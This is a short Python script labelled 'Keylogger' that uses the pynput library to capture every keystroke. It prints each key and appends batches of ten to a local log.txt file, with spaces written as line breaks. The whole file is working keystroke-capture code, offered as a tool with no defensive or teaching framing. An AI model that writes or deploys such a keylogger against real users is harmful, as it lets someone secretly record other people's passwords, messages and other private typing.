#Keylogger

import pynput

from pynput.keyboard import Key, Listener

#updates the text file every so many keys
count = 0
keys = []

#function
def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []    

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            #removes quotation marks
            k = str(key).replace("'","")
            if k.find("space") > 0:
            #adds a new line whenever the space key is pressed
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
